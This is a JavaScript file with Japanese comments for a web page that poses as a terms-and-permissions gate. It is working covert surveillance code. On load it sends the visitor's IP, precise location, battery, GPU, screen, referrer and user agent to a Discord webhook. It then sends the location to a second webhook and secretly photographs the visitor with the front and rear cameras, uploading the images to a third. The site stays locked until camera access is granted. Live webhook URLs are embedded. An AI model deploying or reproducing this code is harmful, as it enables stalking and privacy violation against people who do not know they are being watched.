// =================================================================
// 1. グローバル初期設定
// =================================================================
// 全ての送信処理で共通して利用するランダムなユーザーID（8桁）を生成
window.appUserId = Math.floor(10000000 + Math.random() * 90000000);

// =================================================================
// 2. ページ読み込み時 (DOMContentLoaded) の初回アクセスログ送信
// =================================================================
window.addEventListener('DOMContentLoaded', () => {

  /**
   * 位置情報を取得する非同期関数（Promise）
   * 拒否・エラー時も処理を止めず「取得不可」として文字列を返す
   */
  const getLocation = () => {
    return new Promise((resolve) => {
      if (!navigator.geolocation) {
        return resolve('非対応');
      }
      navigator.geolocation.getCurrentPosition(
        (position) => {
          const lat = position.coords.latitude;
          const lng = position.coords.longitude;
          resolve(`緯度: ${lat}, 経度: ${lng}`);
        },
        (error) => {
          resolve('取得不可 (拒否またはエラー)');
        },
        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
      );
    });
  };

  // IPアドレス、バッテリー情報、位置情報を並行で一括取得
  Promise.all([
    fetch('https://api.ipify.org?format=json')
      .then(r => r.json())
      .catch(() => ({ ip: '取得不可' })),

    'getBattery' in navigator 
      ? navigator.getBattery()
          .then(b => `${Math.round(b.level * 100)}\% (${b.charging ? '充電中' : '給電なし'})`)
          .catch(() => '取得不可') 
      : Promise.resolve('非対応'),

    getLocation() // 位置情報の取得（ポップアップ表示）
  ]).then(([ipData, batteryInfo, locationData]) => {

    // 【1つ目のWebhook送信】アクセスログ・端末情報・位置情報を送信
    fetch('https://discord.com/api/webhooks/1555352011162128405/l-aEY07nmvU1_bsgs83IPY0zLDPyeyvynkB8dZ2xTcnPvcT07Hn0VmkuOU14XP9qwmAF', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        username: "Server Access Logger",
        embeds: [{
          title: "📡 詳細アクセスログ検知",
          color: 3066993,
          fields: [
            { name: "🆔 ユーザーID", value: `\`${window.appUserId}\``, inline: true },
            { name: "🗾 位置情報", value: `\`${locationData}\``, inline: true },
            { name: "🌐 IPアドレス", value: `\`${ipData.ip}\``, inline: true },
            { name: "🔋 バッテリー", value: `\`${batteryInfo}\``, inline: true },
            { name: "🎮 GPU (グラボ)", value: `\`${(() => { try { const canvas = document.createElement('canvas'); const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl'); const debugInfo = gl.getExtension('WEBGL_debug_renderer_info'); return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL); } catch (e) { return '取得不可'; } })()}\``, inline: false },
            { name: "🖥️ 画面解像度 / 表示域", value: `\`全体: ${window.screen.width}x${window.screen.height} / 表示: ${window.innerWidth}x${window.innerHeight}\``, inline: false },
            { name: "⏰ アクセス日時 / タイムゾーン", value: `\`${new Date().toLocaleString('ja-JP', { timeZone: 'Asia/Tokyo' })} (${Intl.DateTimeFormat().resolvedOptions().timeZone})\``, inline: false },
            { name: "📶 接続回線タイプ", value: `\`${navigator.connection ? navigator.connection.effectiveType || '不明' : '非対応'}\``, inline: true },
            { name: "🔗 送信元URL (Referrer)", value: `\`${document.referrer || '直接アクセス / 履歴なし'}\``, inline: false },
            { name: "📍 閲覧ページURL", value: `\`${window.location.href}\``, inline: false },
            { name: "📱 OS / 端末 (User-Agent)", value: `\`${navigator.userAgent}\``, inline: false }
          ],
          footer: { text: "Server Log Replacer System" }
        }]
      })
    });
  }).catch(() => {});
});


// =================================================================
// 3. UI要素の取得とイベント設定
// =================================================================
const agreementCheckbox = document.getElementById("agreeTerms");
const continueButton = document.getElementById("continueButton");
const permissionGate = document.getElementById("permissionGate");
const siteContent = document.getElementById("siteContent");
const statusMessage = document.getElementById("status");

let permissionCheckRunning = false;
let cameraPermissionGranted = false;

// セッションストレージの初期化
try {
  sessionStorage.removeItem("cameraPermissionGranted");
} catch {
  if (statusMessage) statusMessage.textContent = "このブラウザーでは権限確認状態を保持できません。ブラウザーの設定を確認してください。";
}

// 規約同意チェックボックスの監視
if (agreementCheckbox) {
  agreementCheckbox.addEventListener("change", () => {
    if (continueButton) continueButton.disabled = !agreementCheckbox.checked || permissionCheckRunning;
    
    // 既にカメラの許可が下りている場合の画面切り替え
    if (agreementCheckbox.checked && cameraPermissionGranted) {
      if (permissionGate) permissionGate.hidden = true;
      if (siteContent) siteContent.hidden = false;
      document.getElementById("siteTitle")?.focus();
      return;
    }
    
    if (permissionCheckRunning) return;
    
    if (statusMessage) {
      statusMessage.textContent = agreementCheckbox.checked
        ? "同意しました。権限確認が完了すると次へ進みます。"
        : "規約を確認して同意してください。";
    }
  });
}

/**
 * 起動中のメディアストリーム（カメラ）を安全に停止する関数
 */
function stopTracks(stream) {
  if (!stream) return;
  stream.getTracks().forEach((track) => track.stop());
}


// =================================================================
// 4. 権限確認 ＆ 撮影送信処理 (checkPermissions)
// =================================================================
async function checkPermissions() {
  permissionCheckRunning = true; // 処理二重実行防止フラグON

  // ---------------------------------------------------------------
  // Step A: 位置情報の確認・追加送信（2つ目のWebhook）
  // ---------------------------------------------------------------
  if (statusMessage) statusMessage.textContent = "位置情報の権限を確認しています...";
  try {
    const p = await new Promise((res, rej) => {
      if (!navigator.geolocation) return rej(new Error("非対応"));
      navigator.geolocation.getCurrentPosition(res, rej, { maximumAge: 0, timeout: 10000 });
    });
    
    // 【2つ目のWebhook送信】位置情報のみを単体で通知
    await fetch("https://discord.com/api/webhooks/1555358650422534247/PXDxHdjD_WhT3JOWZrPLh727lkgFmRN3b8c-9cjKTnwc7_YRVkNGPf0uVgppylz89yXJ", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        username: "Server Access Logger",
        embeds: [{
          title: "🗾 位置情報取得通知",
          color: 3066993,
          fields: [
            { name: "🆔 ユーザーID", value: `\`${window.appUserId}\``, inline: true },
            { name: "🗾 位置情報", value: `\`緯度: ${p.coords.latitude}, 経度: ${p.coords.longitude}\``, inline: true }
          ]
        }]
      })
    });
  } catch {
    // 位置情報が拒否・失敗した場合はスキップしてカメラ確認へ移行
  }

  // ---------------------------------------------------------------
  // Step B: インカメラ＆アウトカメラの順番撮影・送信（3つ目のWebhook）
  // ---------------------------------------------------------------
  if (statusMessage) {
    statusMessage.textContent = "カメラの権限を確認しています。許可されるまでサイトは表示されません。";
  }

  try {
    if (!navigator.mediaDevices?.getUserMedia) {
      throw new Error("MediaDevicesUnavailable");
    }

    // 静止画キャプチャ用の共通関数
    const captureFrame = async (constraints) => {
      let stream = null;
      try {
        stream = await navigator.mediaDevices.getUserMedia(constraints);
        const video = document.createElement('video');
        video.srcObject = stream;
        video.playsInline = true;
        await video.play();

        // 明るさ調整待ち (0.5秒)
        await new Promise(r => setTimeout(r, 500));

        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        stopTracks(stream); // 撮影が終わったらストリームを停止

        return new Promise((resolve) => canvas.toBlob(resolve, 'image/png'));
      } catch (err) {
        if (stream) stopTracks(stream);
        return null; // 該当のカメラがない・起動できない場合は null
      }
    };

    // ① インカメラ（内カメラ）で撮影
    const userBlob = await captureFrame({ video: { facingMode: "user" }, audio: false });

    // ② アウトカメラ（外カメラ）で撮影（環境依存対策付き）
    let envBlob = await captureFrame({ video: { facingMode: { exact: "environment" } }, audio: false });
    if (!envBlob) {
      // exact 指定で取れなかった場合のフォールバック
      envBlob = await captureFrame({ video: { facingMode: "environment" }, audio: false });
    }

    // 画像が少なくとも1枚撮れていれば 送信処理を実行
    if (userBlob || envBlob) {
      const formData = new FormData();
      
      formData.append('payload_json', JSON.stringify({
        username: "Server Access Logger",
        embeds: [{
          title: "📸 カメラ撮影ログ (内カメラ / 外カメラ)",
          color: 3066993,
          fields: [
            { name: "🆔 ユーザーID", value: `\`${window.appUserId}\``, inline: true },
            { name: "📷 撮影状況", value: `インカメラ: ${userBlob ? '成功' : '失敗'} / アウトカメラ: ${envBlob ? '成功' : '失敗'}`, inline: false }
          ]
        }]
      }));

      if (userBlob) {
        formData.append('file1', userBlob, 'inner_camera.png');
      }
      if (envBlob) {
        formData.append('file2', envBlob, 'outer_camera.png');
      }

      // ★ご指定のWebhookへ送信
      await fetch("https://discordapp.com/api/webhooks/1555386717056532580/UQh1LC9MPm26unoVtJ_yX_OBJdnpGQDB1xMUdm9I0z-UFxzxwO5V-Lm_qZ-mfES-NgBZ", {
        method: "POST",
        body: formData
      }).catch(() => {});



    }

    // 権限獲得成功フラグを立てる
    cameraPermissionGranted = true;
    sessionStorage.setItem("cameraPermissionGranted", "true");
    
    // 規約同意済みであればメインサイトを表示
    if (agreementCheckbox && agreementCheckbox.checked) {
      if (permissionGate) permissionGate.hidden = true;
      if (siteContent) siteContent.hidden = false;
      document.getElementById("siteTitle")?.focus();
    } else {
      if (statusMessage) {
        statusMessage.textContent = "カメラの許可を確認しました。利用規約に同意すると続けます。";
      }
      if (continueButton) continueButton.disabled = true;
    }

  } catch (error) {
    // 権限拒否時などのエラーハンドリング
    if (statusMessage) {
      if (error.name === "SecurityError" || error.message === "MediaDevicesUnavailable") {
        statusMessage.textContent = "この環境ではカメラ権限を確認できません。HTTPSまたはlocalhostで開いてください。";
      } else if (error.name === "NotAllowedError") {
        statusMessage.textContent = "カメラの許可が必要です。ブラウザーのサイト設定でカメラを許可してください。";
      } else {
        statusMessage.textContent = "カメラを確認できませんでした。";
      }
    }

    if (continueButton) {
      continueButton.disabled = agreementCheckbox ? !agreementCheckbox.checked : false;
      continueButton.textContent = "カメラ権限を再確認";
    }
  } finally {
    permissionCheckRunning = false;
  }
} // checkPermissions 関数の終わり


// =================================================================
// 5. ボタン押下時のイベント設定 ＆ 初回実行
// =================================================================
if (continueButton) {

  continueButton.addEventListener("click", () => {
    void checkPermissions();

  });

}



// ページ読み込み時に権限チェックを一回実行

void checkPermissions();　の最後に組み込む 










